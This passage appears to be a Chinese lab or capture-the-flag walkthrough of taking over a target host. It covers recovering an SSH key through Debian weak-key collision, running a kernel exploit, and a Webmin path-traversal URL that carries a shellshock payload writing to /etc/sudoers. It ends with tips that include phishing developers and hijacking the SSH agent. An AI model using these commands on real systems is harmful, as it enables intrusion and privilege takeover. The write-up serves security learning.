+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># /etc/ssh/sshd_config</span><br><span class="line">PasswordAuthentication no</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>**给私钥再加口令，但本地用 ssh-agent 免输一次  **</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -p -o -f ~/.ssh/id_ed25519   # 后续 ssh-add 解锁</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>**限制来源 IP（可选）  **</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ~/.ssh/authorized_keys 最前面加</span><br><span class="line">from=&quot;10.0.0.0/24&quot; ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>用证书体系（CA 签名）代替逐台拷贝公钥，大规模机器管理更方便。</strong></li>
+</ol>
+<hr>
+<p><strong>一句话速记</strong>  ** <strong><strong><code>~/.ssh/authorized_keys</code></strong> 就是“<strong>SSH 免密白名单</strong>”——</strong>  ** <strong>谁把公钥放进来，谁就能不带密码直接登录；权限必须 600，目录 700，否则 OpenSSH 直接拒。</strong></p>
+<h3 id="-1"><a href="#-1" class="headerlink" title="&#x2F;&#x2F;&#x2F;"></a>&#x2F;&#x2F;&#x2F;</h3><p><strong>发现 vmware 这个用户确实有免密登录的文件，找方法试着登录，看能否成功,不能成功再换其他用户</strong></p>
+<p><strong>成功若权限太低，就换其他用户再试</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306655.png" alt="image-20251111205415943"></p>
+<h2 id="文件泄漏-包含发现敏感文件的经验（精）"><a href="#文件泄漏-包含发现敏感文件的经验（精）" class="headerlink" title="文件泄漏&#x2F;包含发现敏感文件的经验（精）"></a>文件泄漏&#x2F;包含发现敏感文件的经验（精）</h2><p><strong>auto_wordlist 里有</strong></p>
+<p><strong>linux 和 windows 的常见敏感文件</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306656.png" alt="image-20251111205812952"></p>
+<p><strong>可以直接进行关键词搜索   CTRL+F   来找可能的敏感文件，可以直接用</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306657.png" alt="image-20251111210312473"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306658.png" alt="image-20251111210400545"></p>
+<h2 id="用公钥信息破解出私钥（精）"><a href="#用公钥信息破解出私钥（精）" class="headerlink" title="用公钥信息破解出私钥（精）"></a>用公钥信息破解出私钥（精）</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306659.png" alt="image-20251112185610932"></p>
+<p><strong>我们拿到的 authorized_keys 是****公钥</strong> ，公钥一定是放在服务器端的，私钥是管理员自己电脑上，用私钥连接服务器的公钥</p>
+<blockquote>
+<p><strong>[!IMPORTANT]</strong></p>
+<p>**我们需要有自己的私钥库进行碰撞，操作时需要用到伪随机数生成器的库  ****(相当于密码表—不一定会成功，可以多换用户公钥或换密码本)**</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit prng       preudo random number generator</span><br><span class="line">					  伪        随机的 数字  生成器</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306660.png" alt="image-20251128214053156"></p>
+<p><strong>这里涉及到****ssh 非对称加密的机制</strong>的理解，虽然不需要了解算法，但是要知道非对称加密中涉及到 <strong>prng</strong> 这样一件事</p>
+<p>** **<img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306661.png" alt="image-20251112190413247"></p>
+<p><strong>下载一个镜像</strong></p>
+<p><strong>我们采用伪随机数生成器的机制进行碰撞，获得私钥（相当于有公钥，和所有的私钥，找到对应的即可）</strong></p>
+<p><strong>运行脚本</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306662.png" alt="image-20251112190851409"></p>
+<h3 id="下载公私钥对库"><a href="#下载公私钥对库" class="headerlink" title="下载公私钥对库"></a>下载公私钥对库</h3><p><code>wget</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306663.png" alt="image-20251112191040277"></p>
+<h3 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h3><table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>完整单词</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>v</code></td>
+<td><strong>verbose</strong></td>
+<td><strong>显示详细过程（列出正在解压的文件名）</strong></td>
+</tr>
+<tr>
+<td><code>j</code></td>
+<td><strong>bzip2</strong></td>
+<td><strong>通过 bzip2 算法解压缩（对应</strong><code>.tar.bz2</code> 或 <code>.tbz2</code>）</td>
+</tr>
+<tr>
+<td><code>x</code></td>
+<td><strong>extract</strong></td>
+<td><strong>执行“解包&#x2F;解压”操作</strong></td>
+</tr>
+<tr>
+<td><code>f</code></td>
+<td><strong>file</strong></td>
+<td><strong>后接归档文件名（必须与文件名成对出现）</strong></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar vjxf 5622.tar.bz2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306664.png" alt="image-20251112191137201"></p>
+<p><strong>里面带 pub 的是公钥，同名（同编号）的是对应的私钥</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306665.png" alt="image-20251112191250695"></p>
+<p><strong>解压完会新出现一个 rsa 的目录，里面就是公私密钥对</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306666.png" alt="image-20251112191426446"></p>
+<h3 id="用-authorized-keys-的公钥进行搜索"><a href="#用-authorized-keys-的公钥进行搜索" class="headerlink" title="用 authorized_keys 的公钥进行搜索"></a>用 authorized_keys 的公钥进行搜索</h3><p><strong>从 ssh-rsa 开始取 30-40 个数进行搜索就行</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306667.png" alt="image-20251112191655252"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grep -lr &quot;xxx&quot;       递归搜索包括找到下级文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306668.png" alt="image-20251112191939187"></p>
+<p><strong>不一定会成功，这个用户的不行就换另一个试试</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306669.png" alt="image-20251112192242611"></p>
+<p><strong>找到公钥的编号了，完全一致。接下来找没有扩展名</strong><code>.pub</code> 的就是私钥</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306670.png" alt="image-20251112192501187"></p>
+<p><strong>将私钥放在熟悉的位置</strong></p>
+<p><strong>接下来尝试 ssh 登录</strong></p>
+<h2 id="处理-ssh-登录参数问题（精）"><a href="#处理-ssh-登录参数问题（精）" class="headerlink" title="处理 ssh 登录参数问题（精）"></a>处理 ssh 登录参数问题（精）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -i 私钥文件 obama@10.10.10.25       绵密免密登录</span><br><span class="line">		-i 指定私钥</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306671.png" alt="image-20251112192644612"></p>
+<h3 id="主键类型的问题"><a href="#主键类型的问题" class="headerlink" title="主键类型的问题"></a>主键类型的问题</h3><p><strong>无法与 22 端口进行协商，因为没有匹配的主键类型（之前讲过很多次）</strong></p>
+<p><strong>没有什么就给他什么</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -i 私钥文件 obama@10.10.10.25 -oHostKeyAlgorithms=ssh-rsa,ssh-dss</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306672.png" alt="image-20251112193101808"></p>
+<p><strong>现在获得了 banner 的交互，他还找我要密码。相当于我给他私钥，但是****是无效</strong>的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306674.png" alt="image-20251112193303900"></p>
+<p><strong>如何解决：先看一下 ssh 连接的详细过程</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -i 私钥文件 obama@10.10.10.25 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -vv</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306675.png" alt="image-20251112193456915"></p>
+<p><strong>他在执行过程中的数据交换，请求，都会在这个 debug(调试)中列出来</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306676.png" alt="image-20251112193709899"></p>
+<h3 id="pubkey-的问题"><a href="#pubkey-的问题" class="headerlink" title="pubkey 的问题"></a>pubkey 的问题</h3><p><strong>这里说没有共同的签名支持，说明是这行的****pubkey</strong> 的问题，给他参数</p>
+<p><strong>签名是类型的问题（第一个）不是认证的问题（第二个）</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306677.png" alt="image-20251112193923468"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -i 私钥文件 obama@10.10.10.25 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306678.png" alt="image-20251112194028525"></p>
+<p><strong>看似是个小问题，没经验的话这条路径就走不通了</strong></p>
+<h3 id="其他可能遇见的问题"><a href="#其他可能遇见的问题" class="headerlink" title="其他可能遇见的问题"></a>其他可能遇见的问题</h3><blockquote>
+<p><strong>[!IMPORTANT]</strong></p>
+<p><strong>用到 ssh 经常会有：版本的问题，协议的问题，加密的问题（不会的就-vv 显示详细过程，然后 ai）</strong></p>
+</blockquote>
+<h2 id="获得初始权限-shell"><a href="#获得初始权限-shell" class="headerlink" title="获得初始权限 shell"></a>获得初始权限 shell</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306679.png" alt="image-20251112194442296"></p>
+<h2 id="方法一，内核提权及经验（精）"><a href="#方法一，内核提权及经验（精）" class="headerlink" title="方法一，内核提权及经验（精）"></a>方法一，内核提权及经验（精）</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306680.png" alt="image-20251112195007354"></p>
+<p><strong>可以看到这台 ubuntu 的内核是 2.6.22-14-server   现在最新的都 6.多了，所以说****很旧</strong>，肯定有内核漏洞</p>
+<p><strong>一般不尝试内核漏洞提权的原因</strong>：容易让系统宕机，通知管理员，重启服务器….</p>
+<blockquote>
+<p><strong>[!CAUTION]</strong></p>
+<p><strong>搜索内核版本漏洞时不要写的太全</strong></p>
+<p><strong>太细：太少    太初略：太多        筛选内核漏洞是很靠经验的（必要时试试 ai）</strong></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux kernel 2.6.2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306681.png" alt="image-20251112195702883"></p>
+<p>**漏洞太多，再筛选一下，**<strong>只要提权</strong>的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux kernl 2.6.2 |grep &#x27;Privilege Escalation&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306682.png" alt="image-20251112195755160"></p>
+<p><strong>这其实也不少，多试&#x2F;经验</strong></p>
+<p><strong>版本不要太苛刻&#x2F;细</strong>	<strong>不是对应的操作系统</strong>	<strong>要求不要太多</strong></p>
+<p><strong>但是这些情况也不代表一定成功不了，第一次试了没成功也不是说肯定不行，也可能参数有误…</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306683.png" alt="image-20251112200259217">这个不行，因为 sudo -l 用不了，suid 没用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306684.png" alt="image-20251112200519724"></p>
+<p>**要有自己的优先级 **</p>
+<p>**上图标白的看起来比较正常合理，试一下，下载相应的镜像文件  **<code>-m</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306685.png" alt="image-20251112200824590"></p>
+<p><strong>在攻击机开启服务器，在靶机上下载内核提权文件 5092.c</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo php -S 0:80</span><br><span class="line">wget</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306686.png" alt="image-20251112200952309"></p>
+<p><strong>dpkg -l 可以看到有 gcc</strong></p>
+<p><strong>用 gcc 进行编译（本地编译，防止编译环境不同导致不能执行）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 5092.c -o 5092</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306687.png" alt="image-20251112201332305"></p>
+<p><strong>执行 5092</strong>		<strong>.&#x2F;5092</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306688.png" alt="image-20251112201516398"></p>
+<blockquote>
+<p><strong>难点：一，不要轻易使用，可能导致服务中断，或管理员干预</strong></p>
+<p><strong>二，每个给出的漏洞都有可能不成功，需要多长尝试</strong></p>
+</blockquote>
+<h2 id="方法二，shellshock-提权（精-）"><a href="#方法二，shellshock-提权（精-）" class="headerlink" title="方法二，shellshock 提权（精 ）"></a>方法二，shellshock 提权（精 ）</h2><p><strong>回到初始 shell</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306689.png" alt="image-20251112202328999"></p>
+<p><strong>因为版本内核很****旧</strong></p>
+<h3 id="存在？"><a href="#存在？" class="headerlink" title="存在？"></a>存在？</h3><p><strong>验证****shellshock</strong> 是否存在，<strong>首先</strong>要看 <strong>bash 的版本</strong> <code>bash --version</code>，如果<strong>小于 4.3 很可能存在该漏洞</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306690.png" alt="image-20251112202438324"></p>
+<p><strong>验证 shellshock 是否存在的****命令</strong>可以搜，<strong>相对来说是固定</strong>的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=&#x27;() &#123; :; &#125;; echo &quot;It is vulnerable&quot;&#x27; bash -c date</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306691.png" alt="image-20251112202737405"></p>
+<p><strong>在我新起的 bash 进程中，显示了我在上一个进程中建立的环境变量</strong></p>
+<p><strong>出现了我们****echo 的内容</strong>，说明该漏洞存在</p>
+<table>
+<thead>
+<tr>
+<th><strong>片段</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>env</code></td>
+<td><strong>用外部程序设置环境变量，避免当前 shell 提前展开</strong></td>
+</tr>
+<tr>
+<td><code>x=</code></td>
+<td><strong>变量名随意，叫</strong><code>x</code> 只是惯例</td>
+</tr>
+<tr>
+<td><code>() &#123; :; &#125;</code></td>
+<td><strong>最小合法函数体：</strong> <code>()</code> 表示函数名省略（匿名）； <code>&#123; :; &#125;</code> 里 <code>:</code> 是空操作命令，等价于 <code>true</code></td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td><strong>函数定义结束后的****语句分隔符</strong></td>
+</tr>
+<tr>
+<td><code>echo &quot;It is vulnerable&quot;</code></td>
+<td><strong>真正用来“证明被执行”的载荷；</strong> **如果 bash 有漏洞，**<strong>这行会在 bash 启动阶段就运行</strong>，而不是等 <code>-c date</code></td>
+</tr>
+<tr>
+<td><code>bash -c date</code></td>
+<td><strong>启动一个新 bash，让它执行</strong><code>date</code>； <strong>只要 bash 进程被创建，漏洞代码就已执行</strong></td>
+</tr>
+</tbody></table>
+<h3 id="利用？"><a href="#利用？" class="headerlink" title="利用？"></a>利用？</h3><p><strong>让系统执行 bash 环境，然后新建到我们的 cgi 文件中（自设）  不要少了</strong><strong>!</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;#!/bin/bash&quot; &gt;&gt;RedteamNotes.cgi</span><br></pre></td></tr></table></figure>
+
+<p><strong>按照 shellshock 的利用方式，在我们新建的这个文件中，如果我们成功执行了，就可以在这个 bash 环境中获得提权的可能</strong></p>
+<p><strong>还是要利用</strong><code>2017.pl</code> 任意文件读取这个漏洞利用</p>
+<p><strong>既要执行.cgi 又要写上 shellshock 命令语句   <code>2017.pl</code> 干不了这么多怎么办？</strong></p>
+<p><strong>看他的****核心功能</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306692.png" alt="image-20251112204245072"></p>
+<p><strong>http:&#x2F;&#x2F;    0 选项</strong>		<strong>target 的 ip   :    port 端口号</strong>	<strong>&#x2F;unauthenticated</strong>	<strong>temp&#x3D;&#x2F;..%01 乘以 40(也就是 40 个该符合，实际可能用不到这么多)</strong>	<strong>filename 我们需要读的文件名</strong></p>
+<p><strong>所以总结起来就是</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.25:10000/..%01/..%01/..%01/..%01/..%01/..%01/..%01/我们想读的文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306693.png" alt="image-20251112204211275"></p>
+<p><strong>因为要写 shellshock 的命令需要用</strong><strong><code>curl来读（其实burpsuit也行）</code></strong>，我们需要给他<strong>主机头</strong></p>
+<p><strong>shellshock 的利用在主机头中操作是一个很典型的应用</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306694.png" alt="image-20251112205843761"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl http://10.10.10.25:10000/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/obama/RedteamNotes.cgi -A &#x27;() &#123; :; &#125;; /bin/echo &quot;obama ALL=(ALL)ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>-A  是 useragent 的缩写</strong></p>
+<p><strong>用 echo 命令写一条语句，写到 sudoers 文件里去，内容是：obama 这个用户在全部机器（第一个 ALL） 上，全部的用户和用户组中(第二个 ALL)，执行全部的命令（第三个 ALL） ，这样我们就能让 obama 用户是超级用户</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306695.png" alt="image-20251112205807078"></p>
+</blockquote>
+<p><strong>报错：没有执行权限，那是因为没有设置 RedteamNotes 的执行权限（其实建立文件的时候就应该记得****给执行权限</strong>）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306696.png" alt="image-20251112210529618"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306697.png" alt="image-20251112210635955"></p>
+<p>*<em>报错：丢失了文件内容的头。 **	<strong>在建立文件的时候只给了 bash 环境，其他什么都没给</strong>	<strong>但是好像</strong></em><em>不影响</em>*？</p>
+<p><strong>这时我们看看 obama 的权限是不是 ALL</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306698.png" alt="image-20251112210939857"></p>
+<p><strong>这里他要密码，但解法二是由****免密登录</strong>进来的，如何解决？</p>
+<blockquote>
+<p><strong>[!CAUTION]</strong></p>
+<p>**sudo 可以加上 NOPASSWD 参数，来跳过密码 **<strong>obama ALL&#x3D;(ALL) NOPASSWD: ALL</strong></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl http://10.10.10.25:10000/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/obama/RedteamNotes.cgi -A &#x27;() &#123; :; &#125;; /bin/echo &quot;obama ALL=(ALL)NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>这样就可以执行所有 sudo 命令了</strong></p>
+<p><strong>&#x2F;&#x2F;&#x2F;</strong></p>
+<p><strong>shellshock 提权****也</strong>是可以在<strong>解法一</strong>（有密码时）来进行提权的，但这不妨碍我们讲这种提权方式</p>
+<p><strong>我们就照着解法一获得初始 shell 的路走：</strong></p>
+<p><strong>用户名：vmware   密码：h4ckm3</strong>	<strong>ssh 参数缺少说明就给什么</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306699.png" alt="image-20251112211448307"></p>
+<p><strong>我们还是要重新建立文件 RedteamNotes    给执行权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;#!/bin/bash&quot; &gt;&gt;RedteamNotes.cgi</span><br><span class="line">chmod +x RedteamNotes.cgi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl http://10.10.10.25:10000/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/RedteamNotes.cgi -A &#x27;() &#123; :; &#125;; /bin/echo &quot;vmware ALL=(ALL)ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306700.png" alt="image-20251112211927524"></p>
+<p><strong>执行完成后确实有了 ALL 权限</strong></p>
+<p><strong>用超级用户权限新起一个 bash</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143248789.png" alt="image-20251112212106164"></p>
+<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><h3 id="渗透测试里“拿着公钥还能打”的-6-条现实路径"><a href="#渗透测试里“拿着公钥还能打”的-6-条现实路径" class="headerlink" title="渗透测试里“拿着公钥还能打”的 6 条现实路径"></a>渗透测试里“拿着公钥还能打”的 6 条现实路径</h3><p>**思路一句话：**<strong>别跟数学过不去，去找“人”和“实现”的漏洞。</strong></p>
+<ol>
+<li><strong>公钥 ➜ 用户名枚举 ➜ 社工&#x2F;钓鱼</strong><ul>
+<li><strong>把公钥扔进 GitHub、GitLab、HIBP、ssh-rank 等公开库搜一遍，经常能直接定位到开发者的个人账号、邮箱。</strong></li>
+<li><strong>拿到邮箱后走常规社工：克隆仓库投毒、发 PR 投毒、邮件钓鱼让开发者点恶意链接，最终拿到****他的私钥文件</strong>。</li>
+</ul>
+</li>
+<li><strong>公钥指纹 ➜ 横向主机碰撞</strong><ul>
+<li>**用 **<code>ssh-keygen -lf key.pub</code> 得到 16 字节 MD5 或 SHA256 指纹。</li>
+<li>**在内网扫描所有 22 端口，把每台主机的 **<code>ssh-rsa</code> 主机密钥指纹也扫出来。</li>
+<li>**如果开发机与生产机复用了同一对主机密钥，你就能确定“这台就是开发机”，继续打开发机上的个人 **<code>.ssh/id_*</code>。</li>
+</ul>
+</li>
+<li><strong>弱随机数 &#x2F; 弱素数生成器（ROCA、Debian-OpenSSL 事件）</strong><ul>
+<li><strong>2017 年 Infineon TPM 的 RSA 密钥（ROCA）可以在小时级分解；</strong></li>
+<li><strong>2008 年 Debian OpenSSL 熵池补丁导致私钥空间只剩 2^15，能直接暴破。</strong></li>
+<li>**测试方法：用 **<code>roca-detect</code> 或 <code>ssh-keyscan</code> 抓公钥跑一遍，命中就能秒算私钥。</li>
+</ul>
+</li>
+<li><strong>侧信道 &#x2F; 故障注入（本地物理场景）</strong><ul>
+<li><strong>如果你能物理接触目标笔记本，可以用电压毛刺、电磁注入让签名算法出错，</strong></li>
+<li><strong>拿到 1～2 条错误签名后就能用 lattice attack 还原私钥（参考 2021 TPM-Fail 论文）。</strong></li>
+<li><strong>属于高级硬件攻击，红队一般只在外包笔记本丢失场景用。</strong></li>
+</ul>
+</li>
+<li><strong>代理转发滥用（agent hijacking）</strong><ul>
+<li>**开发者常开 **<code>ssh -A</code> 跳板机，把 <code>ssh-agent</code> 带进去。</li>
+<li>**拿到普通用户权限后，直接读 **<code>$SSH_AUTH_SOCK</code> 套接字，就能调用 agent 做签名，<strong>无需私钥文件</strong>。</li>
+<li><strong>工具：</strong><code>ssh-agent-hijack</code>、<code>gpg-agent-enum</code>。</li>
+</ul>
+</li>
+<li><strong>私钥文件残留（备份、镜像、CI）</strong><ul>
+<li>**公钥出现在代码仓库 → 搜同一目录&#x2F;历史提交，经常能拖出 **<code>id_rsa</code> 旧版本。</li>
+<li>**搜 Docker 层、VMDK 快照、ELK 日志、Jenkins **<code>credentials.xml</code>，<strong>私钥文件明文躺尸</strong>概率极高。</li>
+</ul>
+</li>
+</ol>
+<h3 id="linux-目前最新的内核版本是多少"><a href="#linux-目前最新的内核版本是多少" class="headerlink" title="linux 目前最新的内核版本是多少"></a>linux 目前最新的内核版本是多少</h3><p><strong>截至 2025 年 5 月，Linux 内核的官方主线（mainline）版本已推进到 <strong><strong>6.15-rc5</strong>，预计 3–4 周后会发布正式版 6.15 。</strong>  ** <strong>当前可供生产环境使用的****最新稳定版</strong>是 <strong>6.14.5</strong>（2025-05-02 发布）。</strong>  ** **长期支持（LTS）分支中，最新的为 **<strong>6.12.27</strong>（2025-05-05 更新）。</p>
+<h3 id="linux-的-suid"><a href="#linux-的-suid" class="headerlink" title="linux 的 suid"></a>linux 的 suid</h3><p>**在 Linux 里，**<strong>SUID</strong>（Set User ID）是一种特殊的文件权限位。当普通用户执行带 SUID 位的可执行文件时，<strong>进程的有效 UID（euid）会被临时提升为该文件属主（owner）的 UID</strong>，从而拥有文件属主的权限。最典型的例子就是 <code>/usr/bin/passwd</code>：它属主是 root，且带 SUID，因此普通用户也能修改自己的 <code>/etc/shadow</code> 条目。</p>
+<p><strong>SUID 是 Linux 留给普通用户“临时借 root 身份”的后门，</strong> <strong>用得好是便利工具，用不好就是本地提权的快车道。</strong> **防御核心：**<strong>能去就去，不能去就换成 capabilities，再不行就 nosuid + 审计。</strong></p>
+<h3 id="shellshock-漏洞触发流程（恶意场景）"><a href="#shellshock-漏洞触发流程（恶意场景）" class="headerlink" title="shellshock 漏洞触发流程（恶意场景）"></a>shellshock 漏洞触发流程（恶意场景）</h3><ol>
+<li><strong>远程 HTTP 请求里带一个 Header：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: () &#123; :; &#125;; /bin/cat /etc/passwd</span><br></pre></td></tr></table></figure></li>
+<li><strong>Apache + mod_cgi 会把 Header 名&#x2F;值做成环境变量，例如：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP_COOKIE=&quot;() &#123; :; &#125;; /bin/cat /etc/passwd&quot;</span><br></pre></td></tr></table></figure></li>
+<li>**如果 CGI 脚本首行是 **<code>#!/bin/bash</code>，bash 启动时看到“值以 <code>() &#123;</code> 开头”， 先解析成空函数，<strong>然后继续执行后面的 <code>/bin/cat /etc/passwd</code></strong>，造成任意命令执行。</li>
+</ol>
